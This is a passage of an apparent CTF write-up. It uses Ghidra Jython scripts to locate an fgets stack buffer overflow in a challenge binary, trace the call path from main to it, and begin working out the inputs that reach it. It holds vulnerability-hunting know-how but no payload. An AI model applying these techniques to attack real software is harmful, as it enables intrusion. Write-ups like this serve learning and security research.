<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">!=</span> getGlobalFunctions<span class="token punctuation">(</span><span class="token string">&quot;fgets&quot;</span><span class="token punctuation">)</span>
</code></pre></div><p>I ended up finding the address of the <code>fgets</code> function, then getting the <a href="https://ghidra.re/ghidra_docs/api/ghidra/program/model/address/Address.html" target="_blank" rel="noopener noreferrer">Address<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> object from it using <code>toAddr</code>.</p> <div class="language-python extra-class"><pre class="language-python"><code>fgets <span class="token operator">=</span> toAddr<span class="token punctuation">(</span><span class="token number">0x80484a0</span><span class="token punctuation">)</span>
</code></pre></div><p>Straightforward.</p> <h3 id="finding-all-references-to-a-function"><a href="#finding-all-references-to-a-function" class="header-anchor">#</a> Finding all references to a function</h3> <p>This has a surprising trick to it. The first iteration of my script used the ol' reliable</p> <div class="language-python extra-class"><pre class="language-python"><code>xrefs <span class="token operator">=</span> getReferencesTo<span class="token punctuation">(</span>fgets<span class="token punctuation">)</span>
</code></pre></div><p>But it surprisingly only gets you 4096 references. In reality, we have around 19757 references (<em>yes</em>, that many). Our handy documentation also says likewise.
<img src="/assets/img/refs-doc.336cb913.png" alt="getReferencesTo documentation"></p> <p>To get all references, we follow the documentation and use this:</p> <div class="language-python extra-class"><pre class="language-python"><code>xrefs <span class="token operator">=</span> currentProgram<span class="token punctuation">.</span>referenceManager<span class="token punctuation">.</span>getReferencesTo<span class="token punctuation">(</span>fgets<span class="token punctuation">)</span>
</code></pre></div><h3 id="iterating-through-all-references"><a href="#iterating-through-all-references" class="header-anchor">#</a> Iterating through all references</h3> <p>Jython is surprisingly useful, converting our <code>Iterator</code> (what <code>xrefs</code> actually is) to a near-<code>iter</code> type that we can loop over:</p> <div class="language-python extra-class"><pre class="language-python"><code><span class="token keyword">for</span> xref <span class="token keyword">in</span> xrefs<span class="token punctuation">:</span>
  <span class="token keyword">pass</span>
</code></pre></div><h3 id="finding-the-value-of-the-parameters"><a href="#finding-the-value-of-the-parameters" class="header-anchor">#</a> Finding the value of the parameters</h3> <p>Here comes the difficulty, as what we have is just a <a href="https://ghidra.re/ghidra_docs/api/ghidra/program/model/symbol/Reference.html" target="_blank" rel="noopener noreferrer">Reference<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> object, which is pretty useless on its own. But if you look at the assembly code for our <code>fgets</code> call, you can see a pattern.</p> <p><img src="/assets/img/fgets-call.a4c616cb.png" alt="assembly for call to fgets"></p> <p>Since the binary is 32-bit x86, all our arguments are pushed onto the stack. The calling convention states that the first argument (<code>dest</code>) is pushed the last, right before the <code>call</code> instruction. After that is the second arg, <code>n</code>, and pushed onto the stack first will be <code>stdin</code>.</p> <p>So we can just look at the all the pushed arguments in the correct order to get our desired values. Even better, this code seems to be under the least optimization, so these instructions are <em>always</em> generally in this order, despite the many possible optimizations.</p> <div class="custom-block warning"><p class="custom-block-title">WARNING</p> <p>Notice how the first and third parameters (the buffer and stdin) are almost always the same. Usually compilers will just keep this constant and do something like <code>mov [esp-4], {length}</code> to set the length then <code>call fgets</code></p></div> <p>And yes, I used the wonderful method of looking at 15 different examples of this function to see if this pattern holds ðŸ˜ƒ</p> <p>From our <a href="https://ghidra.re/ghidra_docs/api/ghidra/program/model/symbol/Reference.html" target="_blank" rel="noopener noreferrer">Reference<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>, let's try to get the <a href="https://ghidra.re/ghidra_docs/api/ghidra/program/model/listing/Instruction.html" target="_blank" rel="noopener noreferrer">Instruction<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> at it's <a href="https://ghidra.re/ghidra_docs/api/ghidra/program/model/symbol/Reference.html#getFromAddress()" target="_blank" rel="noopener noreferrer">fromAddress<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> using <a href="https://ghidra.re/ghidra_docs/api/ghidra/program/flatapi/FlatProgramAPI.html#getInstructionAt(ghidra.program.model.address.Address)" target="_blank" rel="noopener noreferrer">getInstructionAt<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>. Then let's try to go back and retrieve the previous instructions using <a href="https://ghidra.re/ghidra_docs/api/ghidra/program/flatapi/FlatProgramAPI.html#getInstructionBefore(ghidra.program.model.listing.Instruction)" target="_blank" rel="noopener noreferrer">getInstructionBefore<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>, and <a href="https://ghidra.re/ghidra_docs/api/ghidra/program/model/listing/Instruction.html#getDefaultOperandRepresentationList(int)" target="_blank" rel="noopener noreferrer">get the operands<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> of them.</p> <p>Let's get the relevant instructions first:</p> <div class="language-python extra-class"><pre class="language-python"><code><span class="token keyword">for</span> xref <span class="token keyword">in</span> xrefs<span class="token punctuation">:</span>
    call <span class="token operator">=</span> getInstructionAt<span class="token punctuation">(</span>xref<span class="token punctuation">.</span>fromAddress<span class="token punctuation">)</span>
    push_buffer <span class="token operator">=</span> getInstructionBefore<span class="token punctuation">(</span>call<span class="token punctuation">)</span>
    set_buffer <span class="token operator">=</span> getInstructionBefore<span class="token punctuation">(</span>push_buffer<span class="token punctuation">)</span>
    push_len <span class="token operator">=</span> getInstructionBefore<span class="token punctuation">(</span>set_buffer<span class="token punctuation">)</span>
</code></pre></div><p>Let's reiterate on our instructions again:</p> <div class="language-asm6502 extra-class"><pre class="language-asm6502"><code><span class="token comment">; push stdin</span>
mov eax, dword ptr [ebx + 0xfffffff8] <span class="token comment">; stdin</span>
mov eax, dword ptr [eax] 
sub esp, 0x4
push eax

<span class="token comment">; push n</span>
push 0x15               <span class="token comment">; get 0x15</span>

<span class="token comment">; push dest (ptr relative to rbp)</span>
lea eax, [ebp + -0x63]  <span class="token comment">; get -0x63</span>
push eax

<span class="token comment">; fgets(dest, n, stdin)</span>
call fgets
</code></pre></div><p>Getting the operand values is a bit more difficult, as operands are represented as a <code>List&lt;object&gt;</code>, and each object is something like a <a href="https://ghidra.re/ghidra_docs/api/ghidra/program/model/scalar/Scalar.html" target="_blank" rel="noopener noreferrer">Scalar<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> (constant value), or <a href="https://ghidra.re/ghidra_docs/api/ghidra/program/model/lang/Register.html" target="_blank" rel="noopener noreferrer">Register<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>. e.g. the operands for the instruction to set the buffer parameter, <code>lea eax, [ebp + -0x63]</code>, has these operand representations:</p> <table><thead><tr><th>Operand</th> <th style="text-align:left;">Representations</th></tr></thead> <tbody><tr><td>0: <code>eax</code></td> <td style="text-align:left;">0: <code>Register(eax)</code></td></tr> <tr><td></td> <td style="text-align:left;"></td></tr> <tr><td>1: <code>[ebp + -0x63]</code></td> <td style="text-align:left;">0: <code>'['</code></td></tr> <tr><td></td> <td style="text-align:left;">1: <code>Register(ebp)</code></td></tr> <tr><td></td> <td style="text-align:left;">2: <code>'+'</code></td></tr> <tr><td></td> <td style="text-align:left;">3: <code>Scalar(-0x63)</code></td></tr> <tr><td></td> <td style="text-align:left;">4: <code>']'</code></td></tr></tbody></table> <p>So to get the buffer's length, we have to get the second operand, then get the second last element of the representation list to get a <code>Scalar</code> and read its <code>value</code>.</p> <p>The instruction to set push <code>n</code> onto the stack has these operand representations:</p> <table><thead><tr><th>Operand</th> <th style="text-align:left;">Representations</th></tr></thead> <tbody><tr><td>0: <code>0x15</code></td> <td style="text-align:left;">0: <code>Scalar(0x15)</code></td></tr></tbody></table> <p>The length parameter to the function is just the first <code>Scalar</code> in the representation list of the first operand, since the instruction is just <code>push &lt;const value&gt;</code>.</p> <p>After that, just compare the values and print the address of our offending function call!
The final code is below</p> <div class="language-python extra-class"><pre class="language-python"><code><span class="token comment"># For type checking</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token keyword">from</span> ghidra<span class="token punctuation">.</span>ghidra_builtins <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>

fgets <span class="token operator">=</span> toAddr<span class="token punctuation">(</span><span class="token number">0x80484a0</span><span class="token punctuation">)</span>
xrefs <span class="token operator">=</span> currentProgram<span class="token punctuation">.</span>referenceManager<span class="token punctuation">.</span>getReferencesTo<span class="token punctuation">(</span>fgets<span class="token punctuation">)</span>

<span class="token keyword">for</span> xref <span class="token keyword">in</span> xrefs<span class="token punctuation">:</span>
    call <span class="token operator">=</span> getInstructionAt<span class="token punctuation">(</span>xref<span class="token punctuation">.</span>fromAddress<span class="token punctuation">)</span>
    push_buffer <span class="token operator">=</span> getInstructionBefore<span class="token punctuation">(</span>call<span class="token punctuation">)</span>
    set_buffer <span class="token operator">=</span> getInstructionBefore<span class="token punctuation">(</span>push_buffer<span class="token punctuation">)</span>
    push_len <span class="token operator">=</span> getInstructionBefore<span class="token punctuation">(</span>set_buffer<span class="token punctuation">)</span>

    <span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token operator">-</span>set_buffer<span class="token punctuation">.</span>getDefaultOperandRepresentationList<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value
    length <span class="token operator">=</span> push_len<span class="token punctuation">.</span>getDefaultOperandRepresentationList<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value
    <span class="token keyword">if</span> length <span class="token operator">&gt;</span> <span class="token builtin">buffer</span><span class="token punctuation">:</span>
        printf<span class="token punctuation">(</span><span class="token string">&quot;Found buffer overflow at %s\n&quot;</span><span class="token punctuation">,</span> xref<span class="token punctuation">.</span>fromAddress<span class="token punctuation">)</span>
</code></pre></div><p>The results is as below:</p> <div class="language- extra-class"><pre class="language-text"><code>buzz_fizz_find_calls.py&gt; Running...
Found buffer overflow at 0808aeb0
buzz_fizz_find_calls.py&gt; Finished!
</code></pre></div><p>And it ran surprisingly fast! That address leads us to this:
<img src="/assets/img/stack-overflow.8f479b11.png" alt="vulnerable stack overflow"></p> <p>Ooo, a read of <code>0x15c = 348</code> into a buffer of size <code>87</code></p> <h2 id="finding-the-path-to-this-function"><a href="#finding-the-path-to-this-function" class="header-anchor">#</a> Finding the path to this function</h2> <p>I was hoping this function was called directly by <code>main</code>, but of course it was foolish to think like that. The truth is worse, as it is nowhere close to getting called by <code>main</code>.</p> <blockquote><p>In fact, there are 77 functions between them</p></blockquote> <p>To find the optimal path between <code>main</code> and our function, let's write a script that basically does a DFS from the function of our target address (0x808aeb0) to <code>main</code>, then prints out the functions and the address of the relevant <code>call</code> instructions between them.</p> <div class="language-python extra-class"><pre class="language-python"><code><span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token keyword">from</span> ghidra<span class="token punctuation">.</span>ghidra_builtins <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>

target <span class="token operator">=</span> toAddr<span class="token punctuation">(</span><span class="token number">0x808aeb0</span><span class="token punctuation">)</span>
target_fn <span class="token operator">=</span> getFunctionContaining<span class="token punctuation">(</span>target<span class="token punctuation">)</span>
main <span class="token operator">=</span> getFunctionAt<span class="token punctuation">(</span>toAddr<span class="token punctuation">(</span><span class="token number">0x814c22c</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">explore</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">:</span>
    explored <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">_inner</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> cur <span class="token operator">==</span> end<span class="token punctuation">:</span>
            <span class="token keyword">return</span> path
        <span class="token keyword">if</span> cur <span class="token keyword">in</span> explored<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">None</span>
        explored<span class="token punctuation">.</span>add<span class="token punctuation">(</span>cur<span class="token punctuation">)</span>

        xrefs <span class="token operator">=</span> getReferencesTo<span class="token punctuation">(</span>cur<span class="token punctuation">)</span>
        <span class="token keyword">for</span> xref <span class="token keyword">in</span> xrefs<span class="token punctuation">:</span>
            fn <span class="token operator">=</span> getFunctionContaining<span class="token punctuation">(</span>xref<span class="token punctuation">.</span>fromAddress<span class="token punctuation">)</span>
            <span class="token keyword">if</span> fn <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                <span class="token keyword">continue</span>
            ret_path <span class="token operator">=</span> _inner<span class="token punctuation">(</span>fn<span class="token punctuation">.</span>entryPoint<span class="token punctuation">,</span> path <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> xref<span class="token punctuation">.</span>fromAddress<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># add function and xref address</span>
            <span class="token keyword">if</span> ret_path <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> ret_path
    <span class="token keyword">return</span> _inner<span class="token punctuation">(</span>start<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

rpath <span class="token operator">=</span> explore<span class="token punctuation">(</span>target_fn<span class="token punctuation">.</span>entryPoint<span class="token punctuation">,</span> main<span class="token punctuation">.</span>entryPoint<span class="token punctuation">)</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span>fn<span class="token punctuation">,</span> reach<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span>rpath<span class="token punctuation">)</span><span class="token punctuation">:</span>
    printf<span class="token punctuation">(</span><span class="token string">&quot;call %s, reach %s\n&quot;</span><span class="token punctuation">,</span> fn<span class="token punctuation">,</span> reach<span class="token punctuation">)</span>

</code></pre></div><p>The code is almost standard DFS, except that we append the function at the <code>xref.fromAddress</code> and itself to the path as we traverse till we reach main. Since we go from <code>target_fn</code> to <code>main</code>, we reverse the path when we print it so that we print our the path from <code>main</code> to <code>target_fn</code></p> <div class="language- extra-class"><pre class="language-text"><code>buzz_fizz_path_to_main.py&gt; Running...
call main, reach 0814c635
call FUN_0814668f, reach 08146907
call FUN_0814868f, reach 08148772
call FUN_08147792, reach 08147b84
call FUN_08145c2a, reach 08146001
call FUN_0814a663, reach 0814ab63
call FUN_0812611a, reach 08126191
call FUN_081451af, reach 0814540c
..
call FUN_08109f08, reach 08109f9a
buzz_fizz_path_to_main.py&gt; Finished!
</code></pre></div><p>Note that I used DFS, not <a href="https://www.wikiwand.com/en/Dijkstra%27s_algorithm" target="_blank" rel="noopener noreferrer">Dijkstra's algorithm<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>, so the path may not be the fastest. I will leave that implementation as an exercise for the reader.</p> <h2 id="knowing-the-appropriate-input-to-provide"><a href="#knowing-the-appropriate-input-to-provide" class="header-anchor">#</a> Knowing the appropriate input to provide</h2> <p>We know which functions are to be called in order, as well as the address in each function that we have to somehow reach (where the <code>call</code> instruction is ), in order to go from <code>main</code> to our target function.</p> <p>Those functions are basically of these format:</p> <div class="language-c extra-class"><pre class="language-c"><code><span class="token keyword">void</span> <span class="token function">FUN_080f0351</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">char</span> local_51 <span class="token punctuation">[</span><span class="token number">65</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> local_10<span class="token punctuation">;</span>
  
  local_10 <span class="token operator">=</span> <span class="token function">fizz_buzz</span><span class="token punctuation">(</span><span class="token number">0x4d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>local_10 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">fgets</span><span class="token punctuation">(</span>local_51<span class="token punctuation">,</span><span class="token number">0x35</span><span class="token punctuation">,</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>local_10 <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">FUN_0808431</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>local_10 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">fgets</span><span class="token punctuation">(</span>local_51<span class="token punctuation">,</span><span class="token number">0x1d</span><span class="token punctuation">,</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>local_10 <span class="token operator">!=</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>local_10 <span class="token operator">!=</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">FUN_0808431</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &lt;--- TARGET?</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>local_10 <span class="token operator">==</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">fgets</span><span class="token punctuation">(</span>local_51<span class="token punctuation">,</span><span class="token number">0x1d</span><span class="token punctuation">,</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
</code></pre></div><p>There are multiple calls to <code>fizzbuzz</code>, comparisons with its outputs, and calls to other functions that we want to end as fast as possible. The task seems kind of complicated, but we can simplify the problem:</p> <ol><li><code>fizzbuzz</code> is the only real input that we can use to control program flow, from the start of the function to the <em>reach</em> address. Thus, we can think of reaching an address by giving a list of certain <code>FizzBuzz(max)</code></li> <li>We will have multiple <code>if</code> statements that act on the output of these <code>FizzBuzz(max)</code>. Each of these <code>if</code> statements restrict the output value of <code>fizzbuzz</code>, so let's change the definition of <code>FizzBuzz(max)</code> to <code>FizzBuzz(max, conditions)</code>, where conditions is a list of <code>Equals(X)</code> or <code>NotEquals(X)</code>, where <code>X</code> is a constant</li> <li>There is only one <code>fgets</code> that we provide input to, so we can ignore the presence of the rest of the <code>fgets</code></li> <li>If we go into an external function (think <code>FUN_0808431</code>) but it isn't our <em>reach</em> address, consider it a function that we have to exit fast out of. Let's represent this with <code>ExitFast(fn)</code></li> <li>For each <code>ExitFast(fn)</code>, we have to replace it with the list of <code>FizzBuzz(max, conditions)</code> that represent the <em>fastest</em> way to <em>exit</em> (heh) out of that function</li></ol> <p>I chose to utilize Ghidra's more esoteric features to solve this problem, mostly that of <code>PCode</code>. But let's get some definitions out of the way.</p> <h3 id="pcodeop"><a href="#pcodeop" class="header-anchor">#</a> PCodeOp</h3> <p><a href="https://ghidra.re/ghidra_docs/api/ghidra/program/model/pcode/PcodeOp.html" target="_blank" rel="noopener noreferrer">PCodeOp<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>s are the raw underlying platform-independent code that every instruction in a particular assembly language makes up. They abstract over the implementation details of each platform's assembly language, and present them as precisely as possible. e.g.</p> <div class="language- extra-class"><pre class="language-text"><code>SUB   ESP,0x10
</code></pre></div><p>becomes</p> <div class="language- extra-class"><pre class="language-text"><code>(1)  CF = INT_LESS ESP, 16:4 
(2)  OF = INT_SBORROW ESP, 16:4 
(3)  ESP = INT_SUB ESP, 16:4 
(4)  SF = INT_SLESS ESP, 0:4 
(5)  ZF = INT_EQUAL ESP, 0:4
</code></pre></div><blockquote><p>(from <a href="https://medium.com/@cetfor/emulating-ghidras-pcode-why-how-dd736d22dfb" target="_blank" rel="noopener noreferrer">https://medium.com/@cetfor/emulating-ghidras-pcode-why-how-dd736d22dfb<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>)</p></blockquote> <h3 id="pcodeopast"><a href="#pcodeopast" class="header-anchor">#</a> PCodeOpAST</h3> <p>While it may be specific, <a href="https://ghidra.re/ghidra_docs/api/ghidra/program/model/pcode/PcodeOp.html" target="_blank" rel="noopener noreferrer">PCodeOp<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>s lose a lot of their higher-level meaning. Ghidra has a way to convert these <a href="https://ghidra.re/ghidra_docs/api/ghidra/program/model/pcode/PcodeOp.html" target="_blank" rel="noopener noreferrer">PCodeOp<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>s to <a href="https://ghidra.re/ghidra_docs/api/ghidra/program/model/pcode/PcodeOpAST.html" target="_blank" rel="noopener noreferrer">PCodeOpAST<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path 